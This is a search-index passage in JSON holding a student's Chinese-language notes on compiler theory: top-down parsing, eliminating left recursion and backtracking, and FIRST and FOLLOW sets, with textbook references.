\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u65b9\u6cd5\u7684\u95ee\u9898 2.5.1. \u6587\u6cd5\u5de6\u9012\u5f52\u95ee\u9898 2.5.2. \u56de\u6eaf\u95ee\u9898 3. \u6d88\u9664\u6587\u6cd5\u7684\u5de6\u9012\u5f52 3.1. \u76f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664 3.2. \u95f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664 4. \u6d88\u9664\u56de\u6eaf 4.1. FIRST\u96c6\u5408 4.2. \u63d0\u53d6\u516c\u5171\u5de6\u56e0\u5b50 4.3. FOLLOW\u96c6\u5408 5. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u5b66\u4e60\u4e86\u7f16\u8bd1\u539f\u7406\u4e2d\u7684 \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 \u8fd9\u4e00\u7ae0\u8282\uff0c\u6211\u53c2\u8003\u4e86\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750 1 \u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002 2. \u8bed\u6cd5\u5206\u6790 # 2.1. \u8bed\u6cd5\u5206\u6790\u7684\u524d\u63d0 # \u5bf9\u8bed\u8a00\u7684\u8bed\u6cd5\u7ed3\u6784\u8fdb\u884c\u63cf\u8ff0 \u91c7\u7528 \u6b63\u89c4\u5f0f \u548c \u6709\u9650\u81ea\u52a8\u673a \u63cf\u8ff0\u548c\u8bc6\u522b\u8bed\u8a00\u7684 \u5355\u8bcd\u7b26\u53f7 \u7528 \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 \u6765\u63cf\u8ff0\u8bed\u6cd5\u89c4\u5219 2.2. \u8bed\u6cd5\u5206\u6790\u7684\u4efb\u52a1 # \u8bed\u6cd5\u5206\u6790\u7684\u4efb\u52a1 \u5206\u6790\u4e00\u4e2a\u6587\u6cd5\u7684\u53e5\u5b50\u7684\u7ed3\u6784 \u8bed\u6cd5\u5206\u6790\u5668\u7684\u529f\u80fd \u6309\u7167\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f(\u8bed\u8a00\u7684\u8bed\u6cd5\u89c4\u5219)\uff0c\u8bc6\u522b\u8f93\u5165\u7b26\u53f7\u4e32\u662f\u5426\u4e3a\u4e00\u4e2a\u53e5\u5b50(\u5408\u5f0f\u7a0b\u5e8f) 2.3. \u8bed\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u7684\u5730\u4f4d # graph TD O(\u6e90\u7a0b\u5e8f) --> |\u6e90\u7a0b\u5e8f|A A[\u8bcd\u6cd5\u5206\u6790\u5668] -->|\u5355\u8bcd\u7b26\u53f7| B[\u8bed\u6cd5\u5206\u6790\u5668] B --> |\u53d6\u4e0b\u4e00\u5355\u8bcd|A C[\u7b26\u53f7\u8868] --- A C[\u7b26\u53f7\u8868] --- B B --> |\u8bed\u6cd5\u5206\u6790\u6811|D[\u7f16\u8bd1\u7a0b\u5e8f\u540e\u7eed\u90e8\u5206] D --> ... 2.4. \u8bed\u6cd5\u5206\u6790\u7684\u65b9\u6cd5 # 2.4.1. \u81ea\u4e0b\u800c\u4e0a(Bottom-up) # \u5b9a\u4e49\uff1a\u4ece\u8f93\u5165\u4e32\u5f00\u59cb\uff0c\u9010\u6b65\u8fdb\u884c\u5f52\u7ea6\uff0c\u76f4\u5230\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7 \u5f52\u7ea6\uff1a\u6839\u636e\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f\u89c4\u5219\uff0c\u628a\u4e32\u4e2d\u51fa\u73b0\u7684\u4ea7\u751f\u5f0f\u7684\u53f3\u90e8\u66ff\u6362\u6210\u5de6\u90e8\u7b26\u53f7 \u7279\u70b9\uff1a\u4ece\u6811\u53f6\u8282\u70b9\u5f00\u59cb\uff0c\u6784\u9020\u8bed\u6cd5\u6811 \u65b9\u6cd5\uff1a\u7b97\u7b26\u4f18\u5148\u5206\u6790\u6cd5\u3001LR\u5206\u6790\u6cd5 2.4.2. \u81ea\u4e0a\u800c\u4e0b(Top-down) # \u5b9a\u4e49\uff1a\u4ece\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7\u51fa\u53d1\uff0c\u53cd\u590d\u4f7f\u7528\u5404\u79cd\u4ea7\u751f\u5f0f\uff0c\u5bfb\u627e\"\u5339\u914d\"\u7684\u63a8\u5bfc \u63a8\u5bfc\uff1a\u6839\u636e\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f\u89c4\u5219\uff0c\u628a\u4e32\u4e2d\u51fa\u73b0\u7684\u4ea7\u751f\u5f0f\u7684\u5de6\u90e8\u7b26\u53f7\u66ff\u6362\u6210\u53f3\u90e8 \u7279\u70b9\uff1a\u4ece\u6811\u7684\u6839\u5f00\u59cb\uff0c\u6784\u9020\u8bed\u6cd5\u6811 \u65b9\u6cd5\uff1a\u9012\u5f52\u4e0b\u964d\u5206\u6790\u6cd5\u3001\u9884\u6d4b\u5206\u6790\u7a0b\u5e8f 2.5. \u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u65b9\u6cd5\u7684\u95ee\u9898 # 2.5.1. \u6587\u6cd5\u5de6\u9012\u5f52\u95ee\u9898 # \u5b9a\u4e49\uff1a\u4e00\u4e2a\u6587\u6cd5\u662f\u542b\u6709\u5de6\u9012\u5f52\u7684\uff0c\u5982\u679c\u5b58\u5728\u975e\u7ec8\u7ed3\u7b26P P \\Rightarrow P \\alpha \u542b\u6709\u5de6\u9012\u5f52\u7684\u6587\u6cd5\u4f7f\u4e0a\u8ff0\u7684\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u8fc7\u7a0b\u9677\u5165\u65e0\u9650\u5faa\u73af\u3002 2.5.2. \u56de\u6eaf\u95ee\u9898 # \u5b9a\u4e49\uff1a\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u7528\u67d0\u4e00\u4e2a\u5019\u9009\u5339\u914d\u6210\u529f\u65f6\uff0c\u8fd9\u79cd\u5339\u914d\u53ef\u80fd\u662f\u6682\u65f6\u7684\u3002\u51fa\u9519\u65f6\uff0c\u4e0d\u5f97\u4e0d\u201c \u56de\u6eaf \u201d\u3002 3. \u6d88\u9664\u6587\u6cd5\u7684\u5de6\u9012\u5f52 # 3.1. \u76f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664 # \u5047\u5b9aP\u5173\u4e8e\u7684\u5168\u90e8\u4ea7\u751f\u5f0f\u662f P - P \\alpha_1 | P \\alpha_2 | \\cdots | P \\alpha_m | \\beta_1 | \\beta_2|\\cdots|\\beta_n (\u6bcf\u4e2a \\alpha \u90fd\u4e0d\u7b49\u4e8e \\epsilon \uff0c\u6bcf\u4e2a \\beta \u90fd\u4e0d\u4ee5 P \u5f00\u5934) \u5de6\u9012\u5f52\u53d8\u53f3\u9012\u5f52 P \\rightarrow \\beta_1 P' | \\beta_2 P' | \\cdots | \\beta_n P' P' \\rightarrow \\alpha_1 P' | \\alpha_2 P' |\\cdots | \\alpha_m P' | \\epsilon 3.2. \u95f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664 # \u95f4\u63a5\u5de6\u9012\u5f52\u5b9a\u4e49\uff1a\u7ed9\u5b9a\u6587\u6cd5 G(S) : S\\rightarrow Qc|c Q\\rightarrow Rb|b R\\rightarrow Sa|a \u867d\u7136\u4e0d\u5b58\u5728\u76f4\u63a5\u5de6\u9012\u5f52\uff0c\u4f46 S\u3001Q\u3001R \u90fd\u662f\u5de6\u9012\u5f52\u7684\uff0c\u4f8b\u5982\u6709 S \\Rightarrow Qc \\Rightarrow Rbc \\Rightarrow Sabc \u4e00\u4e2a\u6587\u6cd5\u6d88\u9664\u5de6\u9012\u5f52\u7684\u6761\u4ef6 \u4e0d\u542b\u4ee5\u03b5\u4e3a\u53f3\u90e8\u7684\u4ea7\u751f\u5f0f \u4e0d\u542b\u56de\u8def P \\Rightarrow P \u6d88\u9664\u5de6\u9012\u5f52\u7684\u7b97\u6cd5\uff1a \u628a\u6587\u6cd5G\u7684\u6240\u6709\u975e\u7ec8\u7ed3\u7b26\u6309\u4efb\u4e00\u79cd\u987a\u5e8f\u6392\u5217 P_1\uff0c P_2\uff0c\\cdots\uff0cP_n\uff1b \u6309\u6b64\u987a\u5e8f\u6267\u884c\u5982\u4e0b\u4f2a\u4ee3\u7801 FOR i:=1 TO n DO BEGIN FOR j:=1 TO i-1 DO (1) (2) END (1) \u628a\u5f62\u5982 P_i \\rightarrow P_j \\gamma \u7684\u89c4\u5219\u6539\u5199\u6210 Pi \\rightarrow \\delta_1 \\gamma | \\delta_2 \\gamma | \u2026 | \\delta_k \\gamma ; ( \u5176\u4e2d P_j \\rightarrow \\delta_1 | \\delta_2 | \\cdots | \\delta_k \u662f\u5173\u4e8e P_j \u7684\u6240\u6709\u89c4\u5219 ) (2) \u6d88\u9664\u5173\u4e8e P_i \u89c4\u5219\u7684\u76f4\u63a5\u5de6\u9012\u5f52\u6027 \u5316\u7b80\u7531 2 \u6240\u5f97\u7684\u6587\u6cd5\uff0c\u53bb\u9664\u4ece\u5f00\u59cb\u7b26\u53f7\u51fa\u53d1\u6c38\u8fdc\u65e0\u6cd5\u5230\u8fbe\u7684\u975e\u7ec8\u7ed3\u7b26\u7684\u4ea7\u751f\u89c4\u5219\u3002 \u4e3e\u4f8b\uff1a\u7ed9\u5b9a\u6587\u6cd5 G(S) \u5982\u4e0b S\\rightarrow Qc|c Q\\rightarrow Rb|b R\\rightarrow Sa|a \u5c06\u975e\u7ec8\u7ed3\u7b26\u6392\u5e8f\u4e3a R\u3001Q\u3001S \u3002\u5bf9\u4e8e R \uff0c\u4e0d\u5b58\u5728\u76f4\u63a5\u5de6\u9012\u5f52\u3002 \u628a R \u5e26\u5165\u5230 Q \u7684\u6709\u5173\u5019\u9009\u540e\uff0c\u6211\u4eec\u628a Q \u7684\u89c4\u5219\u53d8\u4e3a Q\\rightarrow Sab|ab|b \u73b0\u5728 Q \u540c\u6837\u4e0d\u5305\u542b\u76f4\u63a5\u5de6\u9012\u5f52\uff0c\u628a\u5b83\u5e26\u5165\u5230 S \u7684\u6709\u5173\u5019\u9009\u540e\uff0c S \u53d8\u6210 S \\rightarrow Sabc|abc|bc|c \u63a5\u7740\u6d88\u9664 S \u7684\u76f4\u63a5\u5de6\u9012\u5f52\uff0c\u6700\u540e\u5f97\u5230\u7684\u6587\u6cd5\u4e3a S \\rightarrow abcS'|bcS'|cS' S' \\rightarrow abcS' | \\epsilon Q\\rightarrow Sab|ab|b R\\rightarrow Sa|a \u663e\u7136\uff0c\u5176\u4e2d\u5173\u4e8e Q \u548c R \u7684\u89c4\u5219\u5df2\u7ecf\u591a\u4f59\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u5b83\u4eec\u8fdb\u884c\u5316\u7b80\uff0c\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b\u3002 S \\rightarrow abcS'|bcS'|cS' S' \\rightarrow abcS' | \\epsilon \u6ce8\u610f\uff1a\u7531\u4e8e\u5bf9\u975e\u7ec8\u7ed3\u7b26\u6392\u5e8f\u7684\u4e0d\u540c\uff0c\u6700\u540e\u6240\u5f97\u7684\u6587\u6cd5\u5728\u5f62\u5f0f\u4e0a\u53ef\u80fd\u4e0d\u4e00\u6837\u3002\u4f46\u4e0d\u96be\u8bc1\u660e\uff0c\u5b83\u4eec\u90fd\u662f\u7b49\u4ef7\u7684\u3002 4. \u6d88\u9664\u56de\u6eaf # \u6761\u4ef6\uff1a \u5bf9\u6587\u6cd5\u7684\u4efb\u4f55\u975e\u7ec8\u7ed3\u7b26\uff0c\u5f53\u8981\u5b83\u53bb\u5339\u914d\u8f93\u5165\u4e32\u65f6\uff0c\u80fd\u591f\u6839\u636e\u5b83\u6240\u9762\u4e34\u7684\u8f93\u5165\u7b26\u53f7\u51c6\u786e\u5730\u6307\u6d3e\u5b83\u7684\u4e00\u4e2a\u5019\u9009\u53bb\u6267\u884c\u4efb\u52a1\uff0c\u5e76\u4e14\u6b64\u5019\u9009\u7684\u5de5\u4f5c\u7ed3\u679c\u5e94\u662f\u786e\u4fe1\u65e0\u7591\u7684\u3002 \u5373\u5047\u8bbe\u73b0\u5728\u8f6e\u5230\u975e\u7ec8\u7ed3\u7b26 A \u53bb\u6267\u884c\u5339\u914d\u4efb\u52a1\uff0c A \u5171\u6709 n \u4e2a\u5019\u9009\uff0c\u5373 A \\rightarrow \\alpha_1| \\alpha_2| \\cdots | \\alpha_n A \u9762\u4e34\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7 x \u65f6\uff0c\u5982\u679c\u8f93\u5165\u4e32\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u53e5\u5b50\uff0c\u90a3\u4e48 A \u80fd\u591f\u6307\u6d3e\u67d0\u4e2a\u552f\u4e00\u786e\u5b9a\u7684\u5019\u9009 \\alpha_i \u6765\u5339\u914d x \uff0c\u82e5\u4e0d\u80fd\u5339\u914d x \uff0c\u8bf4\u660e\u8f93\u5165\u4e32\u4e0d\u662f\u5408\u6cd5\u7684\u53e5\u5b50\u3002 4.1. FIRST\u96c6\u5408 # \u5b9a\u4e49\uff1a\u4ee4 G \u662f\u4e00\u4e2a\u4e0d\u542b\u5de6\u9012\u5f52\u7684\u6587\u6cd5\uff0c\u5bf9 G \u7684\u6240\u6709\u975e\u7ec8\u7ed3\u7b26\u7684\u6bcf\u4e2a\u5019\u9009 \\alpha \u5b9a\u4e49\u5b83\u7684\u7ec8\u7ed3\u9996\u7b26\u96c6 FIRST(\\alpha) \u4e3a\uff1a FIRST(\\alpha) = \\{ a| \\alpha \\Rightarrow a, \\cdots a \\in V_T \\} \u7279\u522b\u662f\uff0c\u82e5 a \\Rightarrow \\epsilon , \u5219\u89c4\u5b9a: \\epsilon \\in FIRST(\\alpha) \u6362\u53e5\u8bdd\u8bf4\uff0c FIRST(\\alpha) \u662f \\alpha \u7684\u6240\u4ee5\u53ef\u80fd\u63a8\u5bfc\u7684\u5f00\u5934\u7ec8\u7ed3\u7b26 \u6216\u53ef\u80fd\u7684 \\epsilon \u3002 \u5982\u679c\u975e\u7ec8\u7ed3\u7b26 A \u7684\u6240\u6709\u5019\u9009\u9996\u7b26\u96c6\u4e24\u4e24\u4e0d\u76f8\u4ea4\uff0c\u5373 A \u7684\u4efb\u4f55\u4e24\u4e2a\u4e0d\u540c\u5019\u9009 \\alpha_i \u548c \\alpha_j FIRST(\\alpha_i) \\bigcap FIRST(\\alpha_j) = \\varnothing \u90a3\u4e48\uff0c\u5f53\u8981\u6c42 A \u5339\u914d\u8f93\u5165\u4e32\u65f6\uff0c A \u5c31\u80fd\u6839\u636e\u5b83\u6240\u9762\u4e34\u7684\u7b2c\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7 a \uff0c\u51c6\u786e\u5730\u6307\u6d3e\u67d0\u4e00\u4e2a\u5019\u9009\u524d\u53bb\u6267\u884c\u4efb\u52a1\u3002\u8fd9\u4e2a\u5019\u9009\u5c31\u662f\u90a3\u4e2a\u7ec8\u7ed3\u9996\u7b26\u96c6\u542b a \u7684 \\alpha . 4.2. \u63d0\u53d6\u516c\u5171\u5de6\u56e0\u5b50 # \u5047\u5b9a\u5173\u4e8eA\u7684\u89c4\u5219\u662f A \\rightarrow \\delta \\beta_1 | \\delta \\beta_2 | \u2026| \\delta \\beta_n | \\gamma_1 | \\gamma_2 | \u2026 | \\gamma_m (\u5176\u4e2d\uff0c\u6bcf\u4e2a \\gamma \u4e0d\u4ee5 \\delta \u5f00\u5934) \u90a3\u4e48\uff0c\u53ef\u4ee5\u628a\u8fd9\u4e9b\u89c4\u5219\u6539\u5199\u6210 A \\rightarrow \\delta A' | \\gamma_1 | \\gamma_2 | \\cdots | \\gamma_m A' \\rightarrow \\beta_1 | \\beta_2 | \\cdots | \\beta_n \u7ecf\u8fc7\u53cd\u590d\u63d0\u53d6\u5de6\u56e0\u5b50\uff0c\u5c31\u80fd\u591f\u628a\u6bcf\u4e2a\u975e\u7ec8\u7ed3\u7b26(\u5305\u62ec\u65b0\u5f15\u8fdb\u8005)\u7684\u6240\u6709\u5019\u9009\u9996\u7b26\u96c6\u53d8\u6210\u4e3a\u4e24\u4e24\u4e0d\u76f8\u4ea4\u3002 \u5982\u679c\u7a7a\u5b57 \\epsilon \u5c5e\u4e8e\u67d0\u4e2a\u975e\u7ec8\u7ed3\u7b26\u7684\u5019\u9009\u9996\u7b26\u96c6\uff0c\u90a3\u4e48\u95ee\u9898\u5c31\u6bd4\u8f83\u590d\u6742\u3002\u5f15\u5165Follow\u96c6\u5408\u3002 4.3. FOLLOW\u96c6\u5408 # \u5047\u5b9a S \u662f\u6587\u6cd5 G \u7684\u5f00\u59cb\u7b26\u53f7\uff0c\u5bf9\u4e8e G \u7684\u4efb\u4f55\u975e\u7ec8\u7ed3\u7b26 A \uff0c\u6211\u4eec\u5b9a\u4e49 A \u7684FOLLOW\u96c6\u5408 FOLLOW(A) = \\{a|S \\Rightarrow ...Aa..., a \\in V_T \\} \u7279\u522b\u662f\uff0c\u82e5 S \\Rightarrow \\cdots A \u5219\u89c4\u5b9a \\# \\in FOLLOW(A) \u8868\u793a\u82e5 A \u5728\u53e5\u5b50\u7684\u672b\u5c3e\uff0c\u5219\u6807\u793a\u53e5\u5b50\u672b\u5c3e\u7684 \\# \u5728 A \u7684 Follow \u96c6\u5408\u4e2d\u3002 \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750\u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT 5. \u53c2\u8003\u6587\u732e # [1] \u9648\u706b\u65fa. \u7f16\u8bd1\u539f\u7406 [M]. \u5317\u4eac : \u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e, 2010. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u8bed\u6cd5\u5206\u6790 \u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#-","text":"","title":"\u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#_1","text":"\u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 \u76ee\u5f55 1. \u80cc\u666f 2. \u8bed\u6cd5\u5206\u6790 2.1. \u8bed\u6cd5\u5206\u6790\u7684\u524d\u63d0 2.2. \u8bed\u6cd5\u5206\u6790\u7684\u4efb\u52a1 2.3. \u8bed\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u7684\u5730\u4f4d 2.4. \u8bed\u6cd5\u5206\u6790\u7684\u65b9\u6cd5 2.4.1. \u81ea\u4e0b\u800c\u4e0a(Bottom-up) 2.4.2. \u81ea\u4e0a\u800c\u4e0b(Top-down) 2.5. \u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u65b9\u6cd5\u7684\u95ee\u9898 2.5.1. \u6587\u6cd5\u5de6\u9012\u5f52\u95ee\u9898 2.5.2. \u56de\u6eaf\u95ee\u9898 3. \u6d88\u9664\u6587\u6cd5\u7684\u5de6\u9012\u5f52 3.1. \u76f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664 3.2. \u95f4\u63a5\u5de6\u9012\u5f52\u7684\u6d88\u9664 4. \u6d88\u9664\u56de\u6eaf 4.1. FIRST\u96c6\u5408 4.2. \u63d0\u53d6\u516c\u5171\u5de6\u56e0\u5b50 4.3. FOLLOW\u96c6\u5408 5. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#1","text":"\u4eca\u5929\u5b66\u4e60\u4e86\u7f16\u8bd1\u539f\u7406\u4e2d\u7684 \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 \u8fd9\u4e00\u7ae0\u8282\uff0c\u6211\u53c2\u8003\u4e86\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750 1 \u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#2","text":"","title":"2. \u8bed\u6cd5\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#21","text":"\u5bf9\u8bed\u8a00\u7684\u8bed\u6cd5\u7ed3\u6784\u8fdb\u884c\u63cf\u8ff0 \u91c7\u7528 \u6b63\u89c4\u5f0f \u548c \u6709\u9650\u81ea\u52a8\u673a \u63cf\u8ff0\u548c\u8bc6\u522b\u8bed\u8a00\u7684 \u5355\u8bcd\u7b26\u53f7 \u7528 \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 \u6765\u63cf\u8ff0\u8bed\u6cd5\u89c4\u5219","title":"2.1. \u8bed\u6cd5\u5206\u6790\u7684\u524d\u63d0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#22","text":"\u8bed\u6cd5\u5206\u6790\u7684\u4efb\u52a1 \u5206\u6790\u4e00\u4e2a\u6587\u6cd5\u7684\u53e5\u5b50\u7684\u7ed3\u6784 \u8bed\u6cd5\u5206\u6790\u5668\u7684\u529f\u80fd \u6309\u7167\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f(\u8bed\u8a00\u7684\u8bed\u6cd5\u89c4\u5219)\uff0c\u8bc6\u522b\u8f93\u5165\u7b26\u53f7\u4e32\u662f\u5426\u4e3a\u4e00\u4e2a\u53e5\u5b50(\u5408\u5f0f\u7a0b\u5e8f)","title":"2.2. \u8bed\u6cd5\u5206\u6790\u7684\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#23","text":"graph TD O(\u6e90\u7a0b\u5e8f) --> |\u6e90\u7a0b\u5e8f|A A[\u8bcd\u6cd5\u5206\u6790\u5668] -->|\u5355\u8bcd\u7b26\u53f7| B[\u8bed\u6cd5\u5206\u6790\u5668] B --> |\u53d6\u4e0b\u4e00\u5355\u8bcd|A C[\u7b26\u53f7\u8868] --- A C[\u7b26\u53f7\u8868] --- B B --> |\u8bed\u6cd5\u5206\u6790\u6811|D[\u7f16\u8bd1\u7a0b\u5e8f\u540e\u7eed\u90e8\u5206] D --> ...","title":"2.3. \u8bed\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u7684\u5730\u4f4d"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#24","text":"","title":"2.4. \u8bed\u6cd5\u5206\u6790\u7684\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#241-bottom-up","text":"\u5b9a\u4e49\uff1a\u4ece\u8f93\u5165\u4e32\u5f00\u59cb\uff0c\u9010\u6b65\u8fdb\u884c\u5f52\u7ea6\uff0c\u76f4\u5230\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7 \u5f52\u7ea6\uff1a\u6839\u636e\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f\u89c4\u5219\uff0c\u628a\u4e32\u4e2d\u51fa\u73b0\u7684\u4ea7\u751f\u5f0f\u7684\u53f3\u90e8\u66ff\u6362\u6210\u5de6\u90e8\u7b26\u53f7 \u7279\u70b9\uff1a\u4ece\u6811\u53f6\u8282\u70b9\u5f00\u59cb\uff0c\u6784\u9020\u8bed\u6cd5\u6811 \u65b9\u6cd5\uff1a\u7b97\u7b26\u4f18\u5148\u5206\u6790\u6cd5\u3001LR\u5206\u6790\u6cd5","title":"2.4.1. \u81ea\u4e0b\u800c\u4e0a(Bottom-up)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/#242-top-down","text":"\u5b9a\u4e49\uff1a\u4ece\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7\u51fa\u53d1\uff0c\u53cd\u590d\u4f7f\u7528\u5404\u79cd\u4ea7\u751f\u5f0f\uff0c\u5bfb\u627e\"\u5339\u914d\"\u7684\u63a8\u5bfc \u63a8\u5bfc\uff1a\u6839\u636e\u6587\u6cd5\u7684\u4ea7\u751f\u5f0f\u89c4\u5219\uff0c\u628a\u4e32\u4e2d\u51fa\u73b0\u7684\u4ea7\u751f\u5f0f\u7684\u5de6\u90e8\u7b26\u53f7\u66ff\u6362\u6210\u53f3\u90e8 \u7279\u70b9\uff1a\u4ece\u6811\u7684\u6839\u5f00\u59cb\uff0c\u6784\u9020\u8bed\u6cd5\u6811 